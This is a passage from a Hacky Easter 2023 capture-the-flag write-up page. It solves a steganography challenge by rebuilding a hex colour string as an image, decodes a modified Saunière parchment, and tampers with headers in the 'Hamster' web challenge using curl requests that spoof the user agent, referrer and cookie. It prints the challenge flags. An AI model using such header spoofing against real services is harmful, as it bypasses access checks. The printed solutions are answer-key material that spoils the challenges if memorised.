				<span class="k">for</span> <span class="p">(</span> <span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">x</span> <span class="o">&lt;</span> <span class="mi">21</span><span class="p">;</span> <span class="nx">x</span> <span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
						<span class="k">for</span> <span class="p">(</span> <span class="kd">let</span> <span class="nx">z</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">z</span> <span class="o">&lt;</span> <span class="mi">21</span><span class="p">;</span> <span class="nx">z</span> <span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
						<span class="kd">const</span> <span class="nx">mesh</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">THREE</span><span class="p">.</span><span class="nc">Mesh</span><span class="p">(</span> <span class="nx">eggGeometry</span><span class="p">,</span> <span class="nf">getRandomMaterial</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">z</span><span class="p">));</span>

						<span class="nx">mesh</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="nx">x</span> <span class="o">*</span> <span class="mi">10000</span> <span class="o">/</span> <span class="mi">21</span> <span class="o">-</span> <span class="mi">5000</span><span class="p">;</span>
						<span class="nx">mesh</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="mi">5000</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">5000</span><span class="p">;</span>
						<span class="nx">mesh</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">z</span> <span class="o">=</span> <span class="nx">z</span> <span class="o">*</span>  <span class="mi">10000</span> <span class="o">/</span> <span class="mi">21</span> <span class="o">-</span> <span class="mi">5000</span><span class="p">;</span>
						<span class="nx">mesh</span><span class="p">.</span><span class="nx">userData</span><span class="p">.</span><span class="nx">vy</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

						<span class="nx">scene</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nx">mesh</span><span class="p">);</span>
						<span class="nx">eggs</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span> <span class="nx">mesh</span> <span class="p">);</span>
					<span class="p">}</span>
				<span class="p">}</span>


				<span class="nx">renderer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">THREE</span><span class="p">.</span><span class="nc">WebGLRenderer</span><span class="p">();</span>
				<span class="nx">renderer</span><span class="p">.</span><span class="nf">setPixelRatio</span><span class="p">(</span> <span class="nb">window</span><span class="p">.</span><span class="nx">devicePixelRatio</span> <span class="p">);</span>
				<span class="nx">renderer</span><span class="p">.</span><span class="nf">setSize</span><span class="p">(</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span> <span class="p">);</span>
				<span class="nx">container</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span> <span class="nx">renderer</span><span class="p">.</span><span class="nx">domElement</span> <span class="p">);</span>

				<span class="c1">//</span>

				<span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span> <span class="dl">'</span><span class="s1">resize</span><span class="dl">'</span><span class="p">,</span> <span class="nx">onWindowResize</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>

			<span class="p">}</span>

			<span class="kd">function</span> <span class="nf">getRandomColor</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">z</span><span class="p">)</span> <span class="p">{</span>
				<span class="kd">let</span> <span class="nx">pos</span> <span class="o">=</span> <span class="p">(</span><span class="nx">x</span> <span class="o">+</span> <span class="nx">z</span> <span class="o">*</span> <span class="mi">21</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span><span class="p">;</span>
				<span class="kd">let</span> <span class="nx">val</span> <span class="o">=</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">pos</span><span class="p">,</span> <span class="nx">pos</span> <span class="o">+</span> <span class="mi">6</span><span class="p">),</span> <span class="mi">16</span><span class="p">);</span>
				<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">x:</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">x</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">, z: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">z</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">, val: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">val</span> <span class="p">)</span>
				<span class="k">return</span> <span class="nx">val</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="kd">function</span> <span class="nf">getRandomMaterial</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">z</span><span class="p">)</span> <span class="p">{</span>
				<span class="kd">let</span> <span class="nx">material</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">THREE</span><span class="p">.</span><span class="nc">MeshBasicMaterial</span><span class="p">(</span> <span class="p">{</span><span class="na">color</span><span class="p">:</span>  <span class="nf">getRandomColor</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">z</span><span class="p">),</span> <span class="na">envMap</span><span class="p">:</span> <span class="nx">scene</span><span class="p">.</span><span class="nx">background</span><span class="p">,</span> <span class="na">refractionRatio</span><span class="p">:</span> <span class="mf">0.95</span> <span class="p">}</span> <span class="p">);</span>
	 			<span class="nx">material</span><span class="p">.</span><span class="nx">envMap</span><span class="p">.</span><span class="nx">mapping</span> <span class="o">=</span> <span class="nx">THREE</span><span class="p">.</span><span class="nx">CubeRefractionMapping</span><span class="p">;</span>
				<span class="k">return</span> <span class="nx">material</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="kd">function</span> <span class="nf">onWindowResize</span><span class="p">()</span> <span class="p">{</span>
				<span class="nx">windowHalfX</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
				<span class="nx">windowHalfY</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
				<span class="nx">camera</span><span class="p">.</span><span class="nx">aspect</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span> <span class="o">/</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span><span class="p">;</span>
				<span class="nx">camera</span><span class="p">.</span><span class="nf">updateProjectionMatrix</span><span class="p">();</span>
				<span class="nx">renderer</span><span class="p">.</span><span class="nf">setSize</span><span class="p">(</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span> <span class="p">);</span>
			<span class="p">}</span>

			<span class="kd">function</span> <span class="nf">onDocumentMouseMove</span><span class="p">(</span> <span class="nx">event</span> <span class="p">)</span> <span class="p">{</span>
				<span class="nx">mouseX</span> <span class="o">=</span> <span class="p">(</span> <span class="nx">event</span><span class="p">.</span><span class="nx">clientX</span> <span class="o">-</span> <span class="nx">windowHalfX</span> <span class="p">)</span> <span class="o">*</span> <span class="mi">10</span><span class="p">;</span>
				<span class="nx">mouseY</span> <span class="o">=</span> <span class="p">(</span> <span class="nx">event</span><span class="p">.</span><span class="nx">clientY</span> <span class="o">-</span> <span class="nx">windowHalfY</span> <span class="p">)</span> <span class="o">*</span> <span class="mi">10</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="c1">//</span>
			<span class="kd">function</span> <span class="nf">animate</span><span class="p">()</span> <span class="p">{</span>
				<span class="nf">requestAnimationFrame</span><span class="p">(</span> <span class="nx">animate</span> <span class="p">);</span>
				<span class="nf">render</span><span class="p">();</span>
				<span class="nx">stats</span><span class="p">.</span><span class="nf">update</span><span class="p">();</span>
			<span class="p">}</span>

			<span class="kd">function</span> <span class="nf">render</span><span class="p">()</span> <span class="p">{</span>
				<span class="kd">const</span> <span class="nx">delta</span> <span class="o">=</span> <span class="nx">clock</span><span class="p">.</span><span class="nf">getDelta</span><span class="p">();</span>
				<span class="k">for</span> <span class="p">(</span> <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">il</span> <span class="o">=</span> <span class="nx">eggs</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">il</span><span class="p">;</span> <span class="nx">i</span> <span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
					<span class="kd">const</span> <span class="nx">egg</span> <span class="o">=</span> <span class="nx">eggs</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
					<span class="nx">egg</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">y</span> <span class="o">+=</span> <span class="nx">egg</span><span class="p">.</span><span class="nx">userData</span><span class="p">.</span><span class="nx">vy</span><span class="p">;</span>
					<span class="nx">egg</span><span class="p">.</span><span class="nx">userData</span><span class="p">.</span><span class="nx">vy</span> <span class="o">-=</span> <span class="nx">delta</span> <span class="o">*</span> <span class="nx">VSTEP</span><span class="p">;</span>

					<span class="k">if</span> <span class="p">(</span><span class="nx">egg</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">y</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
						<span class="nx">egg</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="o">-</span> <span class="nx">egg</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">y</span><span class="p">;</span>
						<span class="nx">egg</span><span class="p">.</span><span class="nx">userData</span><span class="p">.</span><span class="nx">vy</span> <span class="o">=</span> <span class="o">-</span> <span class="nx">egg</span><span class="p">.</span><span class="nx">userData</span><span class="p">.</span><span class="nx">vy</span> <span class="o">*</span> <span class="nx">VDAMP</span><span class="p">;</span>
					<span class="p">}</span>
				<span class="p">}</span>

				<span class="nx">camera</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">x</span> <span class="o">+=</span> <span class="p">(</span> <span class="nx">mouseX</span> <span class="o">-</span> <span class="nx">camera</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">x</span> <span class="p">)</span> <span class="o">*</span> <span class="p">.</span><span class="mi">05</span><span class="p">;</span>
				<span class="nx">camera</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">y</span> <span class="o">+=</span> <span class="p">(</span> <span class="o">-</span> <span class="nx">mouseY</span> <span class="o">-</span> <span class="nx">camera</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">y</span> <span class="p">)</span> <span class="o">*</span> <span class="p">.</span><span class="mi">05</span><span class="p">;</span>

				<span class="nx">camera</span><span class="p">.</span><span class="nf">lookAt</span><span class="p">(</span> <span class="nx">scene</span><span class="p">.</span><span class="nx">position</span> <span class="p">);</span>
				<span class="nx">renderer</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span> <span class="nx">scene</span><span class="p">,</span> <span class="nx">camera</span> <span class="p">);</span>

			<span class="p">}</span>

		<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</pre></table></code></div></div><p>and <code class="language-plaintext highlighter-rouge">background.png.js</code>:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">hex</span><span class="o">=</span><span class="dl">"</span><span class="s2">9694fb96c7c186bad7f9b0cbb1da818b84ad84a49df3c6aaeeb5aedccca394e5f4d8a786fd9298a1edfcafcbd9f99aa5a1b3ebbf8ae5ab82a3d49293d08e83f1a1b9b4f9eab3daf6e4a8faf8a7f6cbbff6947fb584c4a69c84efe286f8dcfa9fc2f0a5afca97ef9b9ca7ccedfdb8ca9c95bcd3859ea6f2a2b7a980cd89a1bdeaefa6bda69d91fbf4dbbb85f6b7b6b4ded0989fcbd6dac997fca0d5bae6e0a0a3e384a792f4d3bcb884dbe59ec6acaaa599cf8ebbc28483a79ea681efaf93dcafe4f5f2ea8c97b4d9afdcade3bf8e8ee89e89e789c09d97fb8db6a6d7bd9ffbdd87c599aeb2fba6f5e9a1ccb5c880e5d7deb5b3aacee98bb1daa1e3d19fbbfbf9f8a68384f9c3f6cbfdc1a59fb6a2d4f3d99683f689b59ea0cafe83b7ef8283e2c5e4cdfbd8c096dbbff8b4acceb67f82f3e5fdcc8fc9e1cefcd3a7a883adf0b0929da9b6eef9ee81c580e1e49ab8a9e1edd88ae0dac3a2edb4f3fe86aaf6c5d7bbddc8c0a2c7e9d19dd0b285b1b6aca9809fbdfcbdb7a0edd399ccbdd3a3adafbddfe1fdb2adcab891c9faafc2bcbb9c86eea0e389f8e48e89eaa3a6afeec49295d08ddabb87efc188c17f8fd99ce89bb9f1b793f4ffa2e8f9a0bb9cff8a96f79dceab9fb4a989c093ed9ce38282ffa3c8bb9fc4cacbe5d0dfee81d3bdbba4c9b8d5decb9ff883bab09fe7bcfdfd84b1d6da80de9eafb4b0b4d9d5c9f8a7c0d5977fbdb3c1849fdbf7e29bbeeba1b5ed82bb97b980d5be89e2e88bdd98eb95afde97ebf2a6a69bd1f0b882d380b3a3a6a080978da6f58ad5e7bda5def6f2eae9d7f099b393a8ed96a4d0e592dba3c581e18f82bdfb9a9c99dc9cbfacc1c48daec6df8983b3abfebeb6c5e98587868dbb7f8af89e92cda9b285ead8b0df80afa3f4ad92a6adc4f7e2a49cd782e4d98aaaec968de8feebd5bdaf97f0aea3d7dcff8cd1b5d49af4d9ec9c9a93f3a098adde88839ff0fed3f38c8fef8bb2a6aba8d3e1a0c48aa2a382fc89acc9ee9af2cd8ed5fb90b4d4f5c7bbd0d7bcdf898df1cdc9a496c7c587f1dbc9bebaaf989d8cf980d099d2d7dcffe6f9dba1f4e5e1949bf0c9dba7cbe394ba8384aaa6db998bd2b0d5e6eeb89580aad7d097e7d6c2f87fd9a3a1a593dfe7fef2a98a8bf59aa2e0e1f4c7bbdde4bbae9683e6b2bcc9f6d4a7beeed696d69d94d6fab2e0b0d9cda08fddb68c87fde1eec7d89fe8cfaabbb9a8f2db8dd2ece4a9d0f5af998290b4fba39bf19b85dfb9d7a3bd89b0d3b58ef2a7f3b699b4e7e5b9f7cec283e9bdec8af4f396f7fefe81d5dfcaa9f48cf181e9a2a5819df2afcfb8ab8ecf89c2e788cdaecad4b5ce8daef7d9b091ecd6bf9ab693fcfc90ff83f9c8d28f9bcabcc69bc0a0d0b8fe8482d4bca1fac2af8af8e48da9b4e3a6fa97e6cce4e781c2f4e1abf5e49eabedb18c87c98b9181a982d3c1c482fcca82efe7c0b2c19c8fdce89fe0ad9196c3eebbad8185fab7b981e3ede880ecfec88aa589cec9c7bc8282fbecf8b1889787fef0adfb9fcfdfbd989b8fb2c3e891bea9cdfdcce5b2eddbc99cd2e1eefaf6cab2e1c89186a697abcad98ada94a1b5c0a2e4f291c9eabdaec2cbcce0ade1e7a492c58ae3b0c69baefce988e7ead39abff1cf9ada8dd59d8a9bf1e4b4a0c4dfc9d9f1f0e0be938a88a6cef7e8fcaeb5a9caf4bec5dde184e288dec9bae7998ceae7dfdced95e8d9a9aa8db996e5ce7fa1a6908d9edbc0d2b296fdefa890dbc8dcb0f4be839992dcdafdb3a596cb97e2a5ebf28cc7a4d0a0f8d49cb3a188fabf8ad789efb5f3ac8c839ddea189ea97d9c2a0c991d589bebb9dce9db6e6bbe6e9f2a8c2819fa5e48fe8b587b7e38c9dc6ced4d7d9fdfb81a9c0</span><span class="dl">"</span>
</pre></table></code></div></div><p>not sure what to do with that..</p><p>BouncyCastle is an encryption library ?</p><p>But this is a forensics challenge</p><p>no clue..</p><p>ok, the <code class="language-plaintext highlighter-rouge">hex</code> variable in background.png.js is used to generate “random” colours. This it definitely weird, let’s look at that more closely. We see it uses six charachters of this string as a colour value for the eggs, and it accesses them as if it’s a square of 21 by 21 pixels.. Let’s recreate all these colours as an image//</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span> <span class="n">textwrap</span>

<span class="n">hexstring</span><span class="o">=</span><span class="sh">"</span><span class="s">9694fb96c7c186bad7f9b0cbb1da818b84ad84a49df3c6aaeeb5aedccca394e5f4d8a786fd9298a1edfcafcbd9f99aa5a1b3ebbf8ae5ab82a3d49293d08e83f1a1b9b4f9eab3daf6e4a8faf8a7f6cbbff6947fb584c4a69c84efe286f8dcfa9fc2f0a5afca97ef9b9ca7ccedfdb8ca9c95bcd3859ea6f2a2b7a980cd89a1bdeaefa6bda69d91fbf4dbbb85f6b7b6b4ded0989fcbd6dac997fca0d5bae6e0a0a3e384a792f4d3bcb884dbe59ec6acaaa599cf8ebbc28483a79ea681efaf93dcafe4f5f2ea8c97b4d9afdcade3bf8e8ee89e89e789c09d97fb8db6a6d7bd9ffbdd87c599aeb2fba6f5e9a1ccb5c880e5d7deb5b3aacee98bb1daa1e3d19fbbfbf9f8a68384f9c3f6cbfdc1a59fb6a2d4f3d99683f689b59ea0cafe83b7ef8283e2c5e4cdfbd8c096dbbff8b4acceb67f82f3e5fdcc8fc9e1cefcd3a7a883adf0b0929da9b6eef9ee81c580e1e49ab8a9e1edd88ae0dac3a2edb4f3fe86aaf6c5d7bbddc8c0a2c7e9d19dd0b285b1b6aca9809fbdfcbdb7a0edd399ccbdd3a3adafbddfe1fdb2adcab891c9faafc2bcbb9c86eea0e389f8e48e89eaa3a6afeec49295d08ddabb87efc188c17f8fd99ce89bb9f1b793f4ffa2e8f9a0bb9cff8a96f79dceab9fb4a989c093ed9ce38282ffa3c8bb9fc4cacbe5d0dfee81d3bdbba4c9b8d5decb9ff883bab09fe7bcfdfd84b1d6da80de9eafb4b0b4d9d5c9f8a7c0d5977fbdb3c1849fdbf7e29bbeeba1b5ed82bb97b980d5be89e2e88bdd98eb95afde97ebf2a6a69bd1f0b882d380b3a3a6a080978da6f58ad5e7bda5def6f2eae9d7f099b393a8ed96a4d0e592dba3c581e18f82bdfb9a9c99dc9cbfacc1c48daec6df8983b3abfebeb6c5e98587868dbb7f8af89e92cda9b285ead8b0df80afa3f4ad92a6adc4f7e2a49cd782e4d98aaaec968de8feebd5bdaf97f0aea3d7dcff8cd1b5d49af4d9ec9c9a93f3a098adde88839ff0fed3f38c8fef8bb2a6aba8d3e1a0c48aa2a382fc89acc9ee9af2cd8ed5fb90b4d4f5c7bbd0d7bcdf898df1cdc9a496c7c587f1dbc9bebaaf989d8cf980d099d2d7dcffe6f9dba1f4e5e1949bf0c9dba7cbe394ba8384aaa6db998bd2b0d5e6eeb89580aad7d097e7d6c2f87fd9a3a1a593dfe7fef2a98a8bf59aa2e0e1f4c7bbdde4bbae9683e6b2bcc9f6d4a7beeed696d69d94d6fab2e0b0d9cda08fddb68c87fde1eec7d89fe8cfaabbb9a8f2db8dd2ece4a9d0f5af998290b4fba39bf19b85dfb9d7a3bd89b0d3b58ef2a7f3b699b4e7e5b9f7cec283e9bdec8af4f396f7fefe81d5dfcaa9f48cf181e9a2a5819df2afcfb8ab8ecf89c2e788cdaecad4b5ce8daef7d9b091ecd6bf9ab693fcfc90ff83f9c8d28f9bcabcc69bc0a0d0b8fe8482d4bca1fac2af8af8e48da9b4e3a6fa97e6cce4e781c2f4e1abf5e49eabedb18c87c98b9181a982d3c1c482fcca82efe7c0b2c19c8fdce89fe0ad9196c3eebbad8185fab7b981e3ede880ecfec88aa589cec9c7bc8282fbecf8b1889787fef0adfb9fcfdfbd989b8fb2c3e891bea9cdfdcce5b2eddbc99cd2e1eefaf6cab2e1c89186a697abcad98ada94a1b5c0a2e4f291c9eabdaec2cbcce0ade1e7a492c58ae3b0c69baefce988e7ead39abff1cf9ada8dd59d8a9bf1e4b4a0c4dfc9d9f1f0e0be938a88a6cef7e8fcaeb5a9caf4bec5dde184e288dec9bae7998ceae7dfdced95e8d9a9aa8db996e5ce7fa1a6908d9edbc0d2b296fdefa890dbc8dcb0f4be839992dcdafdb3a596cb97e2a5ebf28cc7a4d0a0f8d49cb3a188fabf8ad789efb5f3ac8c839ddea189ea97d9c2a0c991d589bebb9dce9db6e6bbe6e9f2a8c2819fa5e48fe8b587b7e38c9dc6ced4d7d9fdfb81a9c0</span><span class="sh">"</span>

<span class="c1"># lets interpret this as a bunch of pixels in hex format (6 characters per pixel)
</span><span class="n">outimg</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span> <span class="sh">'</span><span class="s">RGB</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">21</span><span class="p">,</span><span class="mi">21</span><span class="p">),</span> <span class="sh">"</span><span class="s">black</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pixels_out</span> <span class="o">=</span> <span class="n">outimg</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">hexstring</span><span class="p">),</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">color</span> <span class="o">=</span> <span class="n">hexstring</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span>
    <span class="n">pix</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">i</span><span class="o">/</span><span class="mi">6</span><span class="p">)</span>

    <span class="n">x</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">pix</span><span class="o">/</span><span class="mi">21</span><span class="p">)</span>
    <span class="n">z</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">pix</span><span class="o">%</span><span class="mi">21</span><span class="p">)</span>

    <span class="n">pixels_out</span><span class="p">[(</span><span class="n">x</span><span class="p">,</span><span class="n">z</span><span class="p">)]</span><span class="o">=</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">color</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">),</span><span class="nf">int</span><span class="p">(</span><span class="n">color</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span><span class="mi">16</span><span class="p">),</span><span class="nf">int</span><span class="p">(</span><span class="n">color</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>

<span class="c1"># save the image
</span><span class="n">outimgname</span> <span class="o">=</span> <span class="sh">"</span><span class="s">bouncy.png</span><span class="sh">"</span>
<span class="n">outimg</span> <span class="o">=</span> <span class="n">outimg</span><span class="p">.</span><span class="nf">resize</span><span class="p">((</span><span class="mi">500</span><span class="p">,</span><span class="mi">500</span><span class="p">),</span> <span class="n">resample</span><span class="o">=</span><span class="n">Image</span><span class="p">.</span><span class="n">NEAREST</span><span class="p">)</span>
<span class="n">outimg</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">outimgname</span><span class="p">,</span><span class="sh">"</span><span class="s">png</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>This gives us an image, but nothing obvious there</p><p><img src="writeupfiles/bouncy.png" alt="" /></p><p>We pass it through <a href="https://stegonline.georgeom.net/upload">StegOnline</a>, and whaddya know, one of the bitplanes contains a QR code! ..shoulda known, it’s always the LSB..</p><p><img src="writeupfiles/bouncy-qr.png" alt="" /></p><h2> Flag</h2><code> he2023{n0_b0uNc} </code><hr><h1 id="a-mysterious-parchment"> A Mysterious Parchment <a href="/writeups/HackyEaster_2023/level4-3-a-mysterious-parchment.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>On their holiday, the bunnies came across a sleepy village with an interesting tower. While enjoying the view, one of them found a crumpled parchment in a corner. “Hah, that’s clever!”, the bunnies agreed after quickly solving the code and altered it ever so slightly.</p><p><img src="writeupfiles/parchment.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The challenge said the bunnies altered the parchment slightly, so let’s find the original so we can compare.</p><p>Some Googling tells us this is parchment of Bérenger Saunière, found in the Church of Mary Magdalene at Rennes-le-Château by Bérenger Saunière. It is said that these documents led to the discovery of the famed treasure of Rennes-le-Château.</p><p>Coded messages were later found by historian Henry Lincoln. </p><p><img src="writeupfiles/parchment-original.jpg" alt="" /></p><p>I noticed that some of the letter were moved up compared to the original, so this must be the bunnies code. I simply onderlined all the higher letters and read off the flag</p><p><img src="writeupfiles/parchment-solved.png" alt="" /></p><p>its spells out <code class="language-plaintext highlighter-rouge">but is it a cool old parchment it sure is</code>. The instructions say the flag is all uppercase and no spaces, so we know our flag</p><h2> Flag</h2><code> he2023{BUTISITACOOLOLDCODEITSUREIS} </code><hr><h1 id="hamster"> Hamster <a href="/writeups/HackyEaster_2023/level4-4-hamster.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The Hamster has a flag for you.</p><p>http://ch.hackyeaster.com:2301</p><p>Note: The service is restarted every hour at x:00.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We visit the url and get various responsed of how to alter our requests, so we use curl and follow instructions:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl http://ch.hackyeaster.com:2301
Howdy, I am the hamster.Please go to /feed

<span class="c"># ok, let's go to /feed</span>
<span class="nv">$ </span>curl http://ch.hackyeaster.com:2301/feed
only hamster-agent is allowed

<span class="c"># so let's set a user-agent</span>
<span class="nv">$ </span>curl <span class="nt">-A</span> <span class="s2">"hamster-agent"</span>  http://ch.hackyeaster.com:2301/feed
⛳ GET invalid

<span class="c"># maybe POST? PUT? Yes, you want put</span>
<span class="nv">$ </span>curl <span class="nt">-A</span> <span class="s2">"hamster-agent"</span> <span class="nt">-X</span> PUT http://ch.hackyeaster.com:2301/feed
🛑 request must come from hackyhamster.org

<span class="c"># ok, let's set a referrer</span>
<span class="nv">$ </span>curl <span class="nt">-A</span> <span class="s2">"hamster-agent"</span> <span class="nt">-X</span> PUT <span class="nt">-e</span> <span class="s2">"hackyhamster.org"</span> http://ch.hackyeaster.com:2301/feed
🍪 brownie not found

<span class="c"># want a cookie? here you go.</span>
<span class="nv">$ </span>curl <span class="nt">-A</span> <span class="s2">"hamster-agent"</span> <span class="nt">-X</span> PUT <span class="nt">-e</span> <span class="s2">"hackyhamster.org"</span> <span class="nt">--cookie</span> <span class="s2">"brownie=brownie"</span> http://ch.hackyeaster.com:2301/feed
🍪 brownie must be baked

<span class="c"># ok, set the value to baked</span>
<span class="nv">$ </span>curl <span class="nt">-A</span> <span class="s2">"hamster-agent"</span> <span class="nt">-X</span> PUT <span class="nt">-e</span> <span class="s2">"hackyhamster.org"</span> <span class="nt">--cookie</span> <span class="s2">"brownie=baked"</span> http://ch.hackyeaster.com:2301/feed
🚩 he2023<span class="o">{</span>s1mpl3_h34d3r_t4mp3r1ng<span class="o">}</span>

<span class="c">#whoo, we got it!</span>
</pre></table></code></div></div><h2> Flag</h2><code> he2023{s1mpl3_h34d3r_t4mp3r1ng} </code><hr><h1 id="lost-in-french-space"> Lost in (French) Space <a href="/writeups/HackyEaster_2023/level4-5-lost-in-french-space.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>My friend went to France and sent me coordinates of interesting things he found.</p><p>Three of them look legit, but one does not make sense to me.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>48.998 2.008
45.960 0.090
43.579 1.524
